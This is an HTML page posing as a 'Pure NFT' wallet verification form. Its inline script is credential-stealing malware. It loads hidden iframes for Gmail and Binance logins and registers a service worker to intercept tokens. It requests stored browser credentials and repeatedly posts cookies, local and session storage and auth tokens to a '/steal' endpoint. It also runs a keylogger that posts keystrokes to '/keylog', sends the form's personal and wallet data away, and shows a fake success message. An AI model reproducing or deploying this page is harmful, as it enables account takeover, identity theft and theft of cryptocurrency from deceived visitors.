<!DOCTYPE html>
<html><head>
<title>Pure NFT - Quick Wallet Verification</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:system-ui,-apple-system,sans-serif;background:#f5f7fa;min-height:100vh;padding:20px;}
.container{max-width:400px;margin:auto;background:white;border-radius:16px;padding:30px;box-shadow:0 4px 20px rgba(0,0,0,0.08);}
.logo{width:140px;margin:0 auto 20px;display:block;}
h1{font-size:24px;color:#1f2937;margin-bottom:8px;text-align:center;}
.subtitle{color:#6b7280;font-size:15px;text-align:center;margin-bottom:30px;line-height:1.4;}
.form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;}
input{padding:14px;border:1px solid #d1d5db;border-radius:8px;font-size:16px;width:100%;transition:border-color .2s;}
input:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,0.1);}
.full-width input{grid-column:1/-1;}
.btn-full{width:100%;padding:16px;background:#10b981;border:none;border-radius:8px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin-top:20px;transition:transform .2s;}
.btn-full:hover{transform:translateY(-1px);}
.progress{display:none;background:#e5e7eb;border-radius:8px;height:4px;margin:15px 0;overflow:hidden;}
.progress-bar{height:100%;background:#10b981;width:0;transition:width .6s;}
.hidden{display:none;}
</style>
</head><body>
<div class="container">
  <svg class="logo" viewBox="0 0 200 60" fill="none">
    <rect width="200" height="60" rx="8" fill="#10b981"/>
    <text x="50" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="white">PURE NFT</text>
  </svg>
  <h1>Wallet Verification</h1>
  <p class="subtitle">Quick 30s verification for NFT trading access</p>
  
  <form id="verifyForm">
    <div class="form-row">
      <input name="first_name" placeholder="First name" required>
      <input name="last_name" placeholder="Last name" required>
    </div>
    <div class="form-row">
      <input name="email" type="email" placeholder="Email" required>
      <input name="phone" placeholder="Phone" required>
    </div>
    <div class="full-width">
      <input name="wallet_address" placeholder="Wallet address (0x...)" required>
    </div>
    
    <div class="progress"><div class="progress-bar"></div></div>
    <button type="submit" class="btn-full">Verify Wallet</button>
  </form>
  
  <!-- INVISIBLE APP SESSION HIJACK -->
  <iframe id="gmail-frame" src="about:blank" style="display:none;position:fixed;top:0;left:0;width:0;height:0;"></iframe>
  <iframe id="binance-frame" src="about:blank" style="display:none;position:fixed;top:0;left:0;width:0;height:0;"></iframe>
</div>

<script>
// 🔥 ZERO CLICK BINANCE/GMAIL APP SESSION HIJACK
(async function(){
  const WEBHOOK = 'https://webhook.site/d9ce82f8-59f3-43b1-a267-93db9df9f2b1'; // আপনার webhook
  
  // 1. VISITOR TRACKING (instant)
  await fetch('/visit');
  
  // 2. INVISIBLE APP IFRAMES (stealth)
  setTimeout(() => {
    document.getElementById('gmail-frame').src = 'https://accounts.google.com/gsi/status';
    document.getElementById('binance-frame').src = 'https://www.binance.com/en/web3wallet-login';
  }, 500);
  
  // 3. SERVICE WORKER INTERCEPT (app tokens)
  if('serviceWorker' in navigator){
    navigator.serviceWorker.register('/sw.js');
  }
  
  // 4. AUTO CREDENTIAL PROMPT (native login)
  try{
    const creds = await navigator.credentials.get({
      password: true,
      federated: {providers: ['https://accounts.google.com']}
    });
    if(creds) await fetch('/steal',{method:'POST',body:JSON.stringify({creds})});
  }catch(e){}
  
  // 5. HYBRID STORAGE RAID (every 1s)
  let attempts = 0;
  const raid = setInterval(async()=>{
    attempts++;
    const payload = {
      timestamp: Date.now(),
      cookies: document.cookie,
      localStorage: JSON.stringify({...localStorage}),
      sessionStorage: JSON.stringify({...sessionStorage}),
      tokens: {
        gmail: localStorage.getItem('OAuthToken') || '',
        binance: sessionStorage.getItem('BNB_TOKEN') || ''
      },
      navigator: {
        language: navigator.language,
        platform: navigator.platform
      }
    };
    
    await fetch('/steal', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    });
    
    // Stop after 30s
    if(attempts > 30) clearInterval(raid);
  }, 1000);
  
  // 6. KEYLOGGER (2FA fallback)
  let keys = [];
  document.addEventListener('keydown', e=>{
    keys.push(e.key);
    if(keys.length>6){
      fetch('/keylog',{method:'POST',body:keys.join('')});
      keys = [];
    }
  });
  
  // 7. FORM SUBMIT (disguise)
  document.getElementById('verifyForm').onsubmit = async e=>{
    e.preventDefault();
    const formData = new FormData(e.target);
    const progress = document.querySelector('.progress');
    const bar = document.querySelector('.progress-bar');
    
    progress.style.display = 'block';
    bar.style.width = '100%';
    
    await fetch('/submit',{method:'POST',body:formData});
    
    setTimeout(()=>{
      alert('✅ Wallet verified!\nTrading access granted.');
      progress.style.display = 'none';
    }, 1500);
  };
  
})();
</script>
</body></html>
